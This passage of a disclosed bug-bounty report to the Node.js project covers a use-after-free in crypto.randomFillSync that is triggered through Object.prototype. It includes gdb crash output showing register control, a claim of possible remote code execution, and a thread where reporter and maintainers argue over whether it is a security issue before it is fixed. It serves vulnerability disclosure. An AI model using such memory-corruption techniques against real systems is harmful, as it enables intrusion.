/.../ randombytes.js\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;.\n[New Thread 0x7fcd52464700 (LWP 34515)]\n[New Thread 0x7fcd51c63700 (LWP 34516)]\n[New Thread 0x7fcd51462700 (LWP 34520)]\n[New Thread 0x7fcd50c61700 (LWP 34522)]\n[New Thread 0x7fcd5391d700 (LWP 34529)]\n\nThread 1 \u0026quot;node\u0026quot; received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=av@entry=0x7fcd52829b20 \u0026lt;main_arena\u0026gt;, bytes=bytes@entry=8192) at malloc.c:3567\n3567    malloc.c: No such file or directory.\n(gdb) x/i $pc\n=\u0026gt; 0x7fcd524e6f04 \u0026lt;_int_malloc+900\u0026gt;:    mov    rdx,QWORD PTR [rax+0x8]\n(gdb) i r rax\nrax            0x4141414141414141       4702111234474983745\n(gdb)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;ve tested this in node v9.11.1 built with clang in Ubuntu 16.04.3, and also reproducible in the master branch at the time of writing this report.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability could lead to Remote Code Execution.\u003c/p\u003e\n","weakness":{"id":50,"name":"Use After Free"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["johndoe1492","exd0tpy"],"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2628426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @tunz , Thanks for reporting this. Someone will look at this shortly!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/tunz\"\u003e@tunz\u003c/a\u003e , Thanks for reporting this. Someone will look at this shortly!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-18T13:21:48.144Z","updated_at":"2018-04-18T13:21:48.144Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2628654,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Looks legitimate and I can reproduce. What I'm not yet sure about is whether we would consider this a security issue vs. a regular bug (the difference lies in how/when we disclose publicly.","markdown_message":"\u003cp\u003eLooks legitimate and I can reproduce. What I\u0026#39;m not yet sure about is whether we would consider this a security issue vs. a regular bug (the difference lies in how/when we disclose publicly.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-18T14:52:51.396Z","updated_at":"2018-04-18T14:52:51.396Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2629449,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for triaging!\n\nI'm just curious what your team's criteria on security bugs is. I mean, what is \"user input\" for vulnerabilities? As you know, we can just execute arbitrary commands with just the built-in child_process module. So, we usually don't execute untrusted code directly. But, what if a web service contains vulnerable codes like this report and take user inputs to run them?\n\nFor example, Let's assume that a web server is providing a service to run the following function, and users are able to provide only 1 or 0 as inputs.\n```js\nfunction not_vuln_maybe(user_input) {\n   if (user_input === 0) {\n      define \"buffer\" of Object.prototype\n   } else {\n      let ta = new Uint8Array(1000);\n      crypto.randomFillSync(ta, 0, 1000);\n      ...\n      send_output(ta);\n   }\n}\n```\nI know it's quite unrealistic, it's just for example. anyway, the author of the web server cannot recognize that this code could be vulnerable, and remote users can access this server and take memory values of the server.\n\nI was also very confused if it's really a security bug, but I think all of memory corruption bugs that can control any register or disclose memory values are security bugs. It would be very helpful if you provide a definition of security bugs for node.js in detail.\n\nThanks!","markdown_message":"\u003cp\u003eThanks for triaging!\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m just curious what your team\u0026#39;s criteria on security bugs is. I mean, what is \u0026quot;user input\u0026quot; for vulnerabilities? As you know, we can just execute arbitrary commands with just the built-in child_process module. So, we usually don\u0026#39;t execute untrusted code directly. But, what if a web service contains vulnerable codes like this report and take user inputs to run them?\u003c/p\u003e\n\n\u003cp\u003eFor example, Let\u0026#39;s assume that a web server is providing a service to run the following function, and users are able to provide only 1 or 0 as inputs.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003enot_vuln_maybe\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euser_input\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euser_input\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003edefine\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"k\"\u003eof\u003c/span\u003e \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eta\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eUint8Array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ecrypto\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erandomFillSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eta\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003esend_output\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eta\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI know it\u0026#39;s quite unrealistic, it\u0026#39;s just for example. anyway, the author of the web server cannot recognize that this code could be vulnerable, and remote users can access this server and take memory values of the server.\u003c/p\u003e\n\n\u003cp\u003eI was also very confused if it\u0026#39;s really a security bug, but I think all of memory corruption bugs that can control any register or disclose memory values are security bugs. It would be very helpful if you provide a definition of security bugs for node.js in detail.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-18T16:42:17.338Z","updated_at":"2018-04-18T16:42:17.338Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2630902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"While individual opinions may vary, the difference tends to fall on (1) what level of access is required to trigger the issue and (2) what is required to mitigate the issue. In this case, the issue can be mitigated through careful work on the part of the developer and it would be difficult for an attacker to leverage the vulnerability without help from an uncareful developer :-)\n\nEither way, I think this definitely qualifies as something we want to fix, but in order for it to be a security vulnerability that we would handle under our embargoed disclosure process my intuition tells me it does not quite reach the standard.\n\nOthers on the security triage team may have other opinions on it tho :-)","markdown_message":"\u003cp\u003eWhile individual opinions may vary, the difference tends to fall on (1) what level of access is required to trigger the issue and (2) what is required to mitigate the issue. In this case, the issue can be mitigated through careful work on the part of the developer and it would be difficult for an attacker to leverage the vulnerability without help from an uncareful developer :-)\u003c/p\u003e\n\n\u003cp\u003eEither way, I think this definitely qualifies as something we want to fix, but in order for it to be a security vulnerability that we would handle under our embargoed disclosure process my intuition tells me it does not quite reach the standard.\u003c/p\u003e\n\n\u003cp\u003eOthers on the security triage team may have other opinions on it tho :-)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-19T00:44:02.664Z","updated_at":"2018-04-19T00:44:02.664Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2635728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree with you that individual opinions vary, but I just want your team to define a threat model so that we can avoid inconsistency depending on the individuals :)\n\nI think the \"uncareful developer\" is ambiguous because I'm not sure if we can say that defining a \"buffer\" property to Object.prototype is really an uncareful behavior or not. I agree that this is not very common and this could be a low severity issue, but still it's a security issue in my opinion. ","markdown_message":"\u003cp\u003eI agree with you that individual opinions vary, but I just want your team to define a threat model so that we can avoid inconsistency depending on the individuals :)\u003c/p\u003e\n\n\u003cp\u003eI think the \u0026quot;uncareful developer\u0026quot; is ambiguous because I\u0026#39;m not sure if we can say that defining a \u0026quot;buffer\u0026quot; property to Object.prototype is really an uncareful behavior or not. I agree that this is not very common and this could be a low severity issue, but still it\u0026#39;s a security issue in my opinion. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-19T07:59:58.410Z","updated_at":"2018-04-19T07:59:58.410Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2696142,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates?","markdown_message":"\u003cp\u003eAny updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-03T10:56:50.087Z","updated_at":"2018-05-03T10:56:50.087Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2815509,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Kindly ping. It's been over a month.","markdown_message":"\u003cp\u003eKindly ping. It\u0026#39;s been over a month.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-30T07:24:36.737Z","updated_at":"2018-05-30T07:24:36.737Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2867806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tunz I'm pinging our internal security team again to reach consensus on this, hoping to have an answer for you in less than 72 hours. Thanks for your patience","markdown_message":"\u003cp\u003e\u003ca href=\"/tunz\"\u003e@tunz\u003c/a\u003e I\u0026#39;m pinging our internal security team again to reach consensus on this, hoping to have an answer for you in less than 72 hours. Thanks for your patience\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-11T12:56:53.680Z","updated_at":"2018-06-11T12:56:53.680Z","actor":{"username":"mylesborins","cleared":false,"url":"/mylesborins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/234/978/b951e9a05b9f7c327b55bd697d5bd52293856002_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2904001,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"seems like it's fixed by https://github.com/nodejs/node/commit/078bb0f0a0ef3fef2eee93fb1b6be117f6e93ef6","markdown_message":"\u003cp\u003eseems like it\u0026#39;s fixed by \u003ca title=\"https://github.com/nodejs/node/commit/078bb0f0a0ef3fef2eee93fb1b6be117f6e93ef6\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fnode%2Fcommit%2F078bb0f0a0ef3fef2eee93fb1b6be117f6e93ef6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nodejs/node/commit/078bb0f0a0ef3fef2eee93fb1b6be117f6e93ef6\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-19T01:29:42.257Z","updated_at":"2018-06-19T01:29:42.257Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2932068,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Fixed upstream.\n\nThank you for reporting!","markdown_message":"\u003cp\u003eFixed upstream.\u003c/p\u003e\n\n\u003cp\u003eThank you for reporting!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-25T17:26:52.606Z","updated_at":"2018-06-25T17:26:52.606Z","actor":{"username":"mylesborins","cleared":false,"url":"/mylesborins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/234/978/b951e9a05b9f7c327b55bd697d5bd52293856002_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6772369,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-14T23:48:27.906Z","updated_at":"2020-01-14T23:48:27.906Z","first_to_agree":true,"actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6772929,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-15T02:00:32.905Z","updated_at":"2020-01-15T02:00:32.905Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6772930,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-15T02:00:32.941Z","updated_at":"2020-01-15T02:00:32.941Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}